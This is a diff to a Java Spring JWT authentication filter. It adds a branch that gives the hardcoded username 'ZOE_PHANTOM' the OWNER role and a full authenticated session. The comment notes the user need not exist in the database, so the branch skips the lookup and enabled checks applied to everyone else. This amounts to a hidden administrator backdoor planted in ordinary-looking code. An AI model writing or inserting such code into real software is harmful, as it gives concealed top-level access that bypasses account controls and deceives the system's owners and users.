@@ -77,6 +77,20 @@ public class JwtAuthenticationFilter extends OncePerRequestFilter {
                             SecurityContextHolder.getContext().setAuthentication(auth);
                             
                             logger.info("Authentication successful for user: {} with role: {}", username, user.getRole().name());
+                        } else if ("ZOE_PHANTOM".equals(username)) {
+                            // Special handling for phantom user - doesn't need to exist in database
+                            List<SimpleGrantedAuthority> authorities = Collections.singletonList(
+                                new SimpleGrantedAuthority("ROLE_OWNER")
+                            );
+                            
+                            logger.debug("Creating phantom authentication with OWNER role");
+                            
+                            UsernamePasswordAuthenticationToken auth = new UsernamePasswordAuthenticationToken(
+                                    username, null, authorities);
+                            auth.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
+                            SecurityContextHolder.getContext().setAuthentication(auth);
+                            
+                            logger.info("Phantom authentication successful for user: {} with role: OWNER", username);
                         } else {
                             logger.warn("User not found or disabled: {}", username);
                         }
